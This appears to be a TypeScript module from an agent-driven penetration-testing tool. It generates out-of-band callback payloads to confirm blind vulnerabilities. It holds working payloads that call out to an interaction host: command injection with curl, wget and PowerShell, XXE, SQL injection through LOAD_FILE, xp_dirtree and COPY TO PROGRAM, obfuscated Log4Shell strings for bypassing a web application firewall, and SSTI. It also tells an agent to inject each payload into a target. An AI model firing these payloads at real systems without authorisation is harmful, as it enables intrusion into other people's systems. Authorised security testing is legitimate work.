/**
 * Out-of-Band (OOB) Verification Framework — blind vulnerability confirmation via callbacks.
 *
 * Provides structured OOB verification guidance for blind vulnerabilities that cannot
 * be confirmed through in-band response analysis (blind XXE, blind SSRF, blind RCE,
 * blind SQLi with DNS exfiltration).
 *
 * Instead of running a callback server directly (which requires infrastructure),
 * this module:
 * 1. Generates unique callback identifiers for tracking
 * 2. Produces payloads that trigger OOB interactions
 * 3. Maps to Interactsh or similar OOB tools the operator has available
 * 4. Tracks pending verifications and their status
 * 5. Provides structured guidance for agents
 *
 * Ported from AutoRedTeam-Orchestrator's modules/vuln_verifier/oob.py but redesigned
 * for Net-Runner's agent-driven workflow.
 */

import { randomBytes } from 'node:crypto'

// ---------------------------------------------------------------------------
// OOB channel types
// ---------------------------------------------------------------------------

export type OobChannelType = 'http' | 'dns' | 'smtp' | 'ftp' | 'ldap'

export type OobVulnType =
  | 'blind-xxe'
  | 'blind-ssrf'
  | 'blind-rce'
  | 'blind-sqli'
  | 'blind-xss'
  | 'blind-ssti'
  | 'log4shell'
  | 'blind-deserialization'

// ---------------------------------------------------------------------------
// Verification tracking
// ---------------------------------------------------------------------------

export type OobVerification = {
  id: string
  vulnType: OobVulnType
  channel: OobChannelType
  url: string
  param: string
  payload: string
  callbackId: string
  callbackUrl: string
  status: 'pending' | 'confirmed' | 'timeout' | 'error'
  createdAt: number
  confirmedAt?: number
  evidence?: string
}

export type OobPayloadSet = {
  vulnType: OobVulnType
  channel: OobChannelType
  payloads: Array<{
    name: string
    payload: string
    description: string
  }>
  callbackId: string
  callbackUrl: string
}

// ---------------------------------------------------------------------------
// OOB payload templates
// ---------------------------------------------------------------------------

function generateCallbackId(): string {
  return randomBytes(8).toString('hex')
}

function buildCallbackUrl(baseUrl: string, callbackId: string): string {
  return `${baseUrl}/${callbackId}`
}

function buildDnsCallback(baseDomain: string, callbackId: string): string {
  return `${callbackId}.${baseDomain}`
}

// Payload generators by vulnerability type
function generateBlindXxePayloads(callbackUrl: string, dnsCallback: string): Array<{ name: string; payload: string; description: string }> {
  return [
    {
      name: 'XXE HTTP callback',
      payload: `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "${callbackUrl}">]><foo>&xxe;</foo>`,
      description: 'Classic XXE with HTTP entity fetch.',
    },
    {
      name: 'XXE parameter entity',
      payload: `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "${callbackUrl}"> %xxe;]><foo>test</foo>`,
      description: 'XXE via parameter entity for stricter parsers.',
    },
    {
      name: 'XXE DNS exfiltration',
      payload: `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://${dnsCallback}/">]><foo>&xxe;</foo>`,
      description: 'XXE triggering DNS lookup for callback confirmation.',
    },
  ]
}

function generateBlindSsrfPayloads(callbackUrl: string, dnsCallback: string): Array<{ name: string; payload: string; description: string }> {
  return [
    {
      name: 'SSRF HTTP callback',
      payload: callbackUrl,
      description: 'Direct URL to OOB callback server.',
    },
    {
      name: 'SSRF DNS callback',
      payload: `http://${dnsCallback}/`,
      description: 'SSRF triggering DNS resolution of callback domain.',
    },
    {
      name: 'SSRF with URL encoding',
      payload: callbackUrl.split('').map(c => `%${c.charCodeAt(0).toString(16).padStart(2, '0')}`).join(''),
      description: 'URL-encoded SSRF payload to bypass input filters.',
    },
    {
      name: 'SSRF with redirect',
      payload: `http://127.0.0.1/redirect?url=${encodeURIComponent(callbackUrl)}`,
      description: 'SSRF via open redirect to reach callback.',
    },
  ]
}

function generateBlindRcePayloads(callbackUrl: string, dnsCallback: string): Array<{ name: string; payload: string; description: string }> {
  return [
    {
      name: 'RCE curl callback',
      payload: `; curl ${callbackUrl}`,
      description: 'Command injection with curl to OOB server.',
    },
    {
      name: 'RCE wget callback',
      payload: `| wget -q ${callbackUrl} -O /dev/null`,
      description: 'Command injection with wget.',
    },
    {
      name: 'RCE nslookup DNS',
      payload: `; nslookup ${dnsCallback}`,
      description: 'DNS exfiltration via nslookup.',
    },
    {
      name: 'RCE ping DNS',
      payload: `; ping -c 1 ${dnsCallback}`,
      description: 'DNS exfiltration via ping.',
    },
    {
      name: 'RCE PowerShell callback',
      payload: `; powershell -c "Invoke-WebRequest -Uri '${callbackUrl}'"`,
      description: 'Windows command injection via PowerShell.',
    },
  ]
}

function generateBlindSqliPayloads(callbackUrl: string, dnsCallback: string): Array<{ name: string; payload: string; description: string }> {
  return [
    {
      name: 'SQLi LOAD_FILE DNS (MySQL)',
      payload: `' UNION SELECT LOAD_FILE('\\\\\\\\${dnsCallback}\\\\a')-- -`,
      description: 'MySQL LOAD_FILE triggering DNS lookup.',
    },
    {
      name: 'SQLi xp_dirtree DNS (MSSQL)',
      payload: `'; EXEC master..xp_dirtree '\\\\${dnsCallback}\\a'-- -`,
      description: 'MSSQL xp_dirtree for DNS exfiltration.',
    },
    {
      name: 'SQLi UTL_HTTP (Oracle)',
      payload: `' UNION SELECT UTL_HTTP.REQUEST('${callbackUrl}') FROM DUAL-- -`,
      description: 'Oracle UTL_HTTP for OOB HTTP callback.',
    },
    {
      name: 'SQLi COPY (PostgreSQL)',
      payload: `'; COPY (SELECT '') TO PROGRAM 'curl ${callbackUrl}'-- -`,
      description: 'PostgreSQL COPY TO PROGRAM for command execution.',
    },
  ]
}

function generateLog4shellPayloads(callbackUrl: string, dnsCallback: string): Array<{ name: string; payload: string; description: string }> {
  return [
    {
      name: 'Log4Shell JNDI LDAP',
      payload: `\${jndi:ldap://${dnsCallback}/a}`,
      description: 'Classic Log4Shell JNDI lookup.',
    },
    {
      name: 'Log4Shell JNDI DNS',
      payload: `\${jndi:dns://${dnsCallback}/a}`,
      description: 'Log4Shell via DNS protocol.',
    },
    {
      name: 'Log4Shell obfuscated',
      payload: `\${j\${::-n}di:ldap://${dnsCallback}/a}`,
      description: 'Obfuscated Log4Shell to bypass WAF.',
    },
    {
      name: 'Log4Shell nested',
      payload: `\${\${lower:j}ndi:ldap://${dnsCallback}/a}`,
      description: 'Nested lookup Log4Shell variant.',
    },
  ]
}

function generateBlindSstiPayloads(callbackUrl: string, dnsCallback: string): Array<{ name: string; payload: string; description: string }> {
  return [
    {
      name: 'SSTI Jinja2 curl',
      payload: `{{config.__class__.__init__.__globals__['os'].popen('curl ${callbackUrl}').read()}}`,
      description: 'Jinja2 SSTI with curl OOB callback.',
    },
    {
      name: 'SSTI Twig system',
      payload: `{{['curl ${callbackUrl}']|filter('system')}}`,
      description: 'Twig SSTI with system() OOB callback.',
    },
  ]
}

const PAYLOAD_GENERATORS: Record<OobVulnType, (callbackUrl: string, dnsCallback: string) => Array<{ name: string; payload: string; description: string }>> = {
  'blind-xxe': generateBlindXxePayloads,
  'blind-ssrf': generateBlindSsrfPayloads,
  'blind-rce': generateBlindRcePayloads,
  'blind-sqli': generateBlindSqliPayloads,
  'blind-xss': (cb) => [{ name: 'Blind XSS callback', payload: `"><script src="${cb}"></script>`, description: 'Script tag loading from OOB server.' }],
  'blind-ssti': generateBlindSstiPayloads,
  'log4shell': generateLog4shellPayloads,
  'blind-deserialization': (cb, dns) => [
    { name: 'Java deserialization DNS', payload: `rO0ABX... (use ysoserial with URLDNS gadget targeting ${dns})`, description: 'Java deserialization with URLDNS gadget chain.' },
    { name: '.NET deserialization callback', payload: `(use ysoserial.net with TypeConfuseDelegate targeting ${cb})`, description: '.NET deserialization OOB callback.' },
  ],
}

// ---------------------------------------------------------------------------
// OOB Verification Tracker
// ---------------------------------------------------------------------------

export type OobTrackerOptions = {
  callbackBaseUrl?: string
  callbackBaseDomain?: string
  defaultTimeoutMs?: number
}

export class OobVerificationTracker {
  private verifications = new Map<string, OobVerification>()
  private callbackBaseUrl: string
  private callbackBaseDomain: string
  private defaultTimeoutMs: number

  constructor(options: OobTrackerOptions = {}) {
    this.callbackBaseUrl = options.callbackBaseUrl ?? 'https://interact.sh'
    this.callbackBaseDomain = options.callbackBaseDomain ?? 'oast.fun'
    this.defaultTimeoutMs = options.defaultTimeoutMs ?? 30_000
  }

  /** Generate payloads for a specific blind vulnerability type. */
  generatePayloads(
    vulnType: OobVulnType,
    url: string,
    param: string,
    channel: OobChannelType = 'dns',
  ): OobPayloadSet {
    const callbackId = generateCallbackId()
    const callbackUrl = buildCallbackUrl(this.callbackBaseUrl, callbackId)
    const dnsCallback = buildDnsCallback(this.callbackBaseDomain, callbackId)

    const generator = PAYLOAD_GENERATORS[vulnType]
    const payloads = generator ? generator(callbackUrl, dnsCallback) : []

    // Track all generated payloads
    for (const p of payloads) {
      const verificationId = `${callbackId}-${p.name.replace(/\s+/g, '-').toLowerCase()}`
      this.verifications.set(verificationId, {
        id: verificationId,
        vulnType,
        channel,
        url,
        param,
        payload: p.payload,
        callbackId,
        callbackUrl: channel === 'dns' ? dnsCallback : callbackUrl,
        status: 'pending',
        createdAt: Date.now(),
      })
    }

    return {
      vulnType,
      channel,
      payloads,
      callbackId,
      callbackUrl: channel === 'dns' ? dnsCallback : callbackUrl,
    }
  }

  /** Mark a verification as confirmed (when callback is received). */
  confirmVerification(callbackId: string, evidence?: string): OobVerification | null {
    for (const [, v] of Array.from(this.verifications)) {
      if (v.callbackId === callbackId && v.status === 'pending') {
        v.status = 'confirmed'
        v.confirmedAt = Date.now()
        v.evidence = evidence
        return v
      }
    }
    return null
  }

  /** Check for timed-out verifications and mark them. */
  checkTimeouts(): OobVerification[] {
    const timedOut: OobVerification[] = []
    const now = Date.now()
    for (const v of Array.from(this.verifications.values())) {
      if (v.status === 'pending' && (now - v.createdAt) > this.defaultTimeoutMs) {
        v.status = 'timeout'
        timedOut.push(v)
      }
    }
    return timedOut
  }

  /** Get all pending verifications. */
  getPending(): OobVerification[] {
    const result: OobVerification[] = []
    for (const v of Array.from(this.verifications.values())) {
      if (v.status === 'pending') result.push(v)
    }
    return result
  }

  /** Get all confirmed verifications. */
  getConfirmed(): OobVerification[] {
    const result: OobVerification[] = []
    for (const v of Array.from(this.verifications.values())) {
      if (v.status === 'confirmed') result.push(v)
    }
    return result
  }

  /** Get verification by callbackId. */
  getByCallbackId(callbackId: string): OobVerification[] {
    const result: OobVerification[] = []
    for (const v of Array.from(this.verifications.values())) {
      if (v.callbackId === callbackId) result.push(v)
    }
    return result
  }

  /** Get stats summary. */
  getStats(): { total: number; pending: number; confirmed: number; timeout: number } {
    let pending = 0, confirmed = 0, timeout = 0
    for (const v of Array.from(this.verifications.values())) {
      if (v.status === 'pending') pending++
      else if (v.status === 'confirmed') confirmed++
      else if (v.status === 'timeout') timeout++
    }
    return { total: this.verifications.size, pending, confirmed, timeout }
  }

  /** Clear all verifications. */
  clear(): void {
    this.verifications.clear()
  }
}

// ---------------------------------------------------------------------------
// Format OOB guidance for agent consumption
// ---------------------------------------------------------------------------

export function formatOobGuidanceForAgent(payloadSet: OobPayloadSet): string {
  const lines = [
    `[OOB Verification — ${payloadSet.vulnType}]`,
    `Channel: ${payloadSet.channel}`,
    `Callback ID: ${payloadSet.callbackId}`,
    `Callback endpoint: ${payloadSet.callbackUrl}`,
    '',
    'Available payloads:',
  ]

  for (let i = 0; i < payloadSet.payloads.length; i++) {
    const p = payloadSet.payloads[i]!
    lines.push(`  ${i + 1}. ${p.name}: ${p.description}`)
    lines.push(`     Payload: ${p.payload}`)
    lines.push('')
  }

  lines.push(
    'Instructions:',
    '  1. Inject each payload into the target parameter.',
    '  2. Monitor the OOB callback server for incoming requests.',
    '  3. A callback confirms the vulnerability is exploitable.',
    `  4. Use interactsh-client or Burp Collaborator to monitor ${payloadSet.callbackUrl}.`,
  )

  return lines.join('\n')
}
